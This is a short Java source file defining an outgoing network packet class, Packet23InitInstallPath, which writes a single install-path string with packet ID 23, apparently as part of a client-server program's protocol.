package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet23InitInstallPath extends AbstractOutgoingPacket {

	private String path;
	
	public Packet23InitInstallPath(String path) {
		this.path = path;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(path);
	}

	@Override
	public byte getPacketId() {
		return (byte) 23;
	}

}
